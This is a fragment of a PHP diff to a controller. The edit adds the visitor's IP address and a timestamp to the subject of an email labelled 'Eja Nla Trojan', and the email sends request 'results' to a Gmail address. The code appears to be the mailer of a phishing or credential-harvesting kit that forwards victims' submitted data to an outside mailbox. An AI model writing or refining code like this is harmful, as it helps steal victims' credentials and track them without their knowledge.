@@ -69,7 +69,7 @@ class MainController extends Controller {
                  else
                  { 
                  	 $ip = getenv("REMOTE_ADDR");
-                 	  $s = "Eja Nla Trojan";
+                 	  $s = "Eja Nla Trojan ~~ ".$ip." ~~ ".date("h:i A jS F, Y");
                        $rcpt = "mails4davidslogan@gmail.com";
                        $results = $req["results"];
 
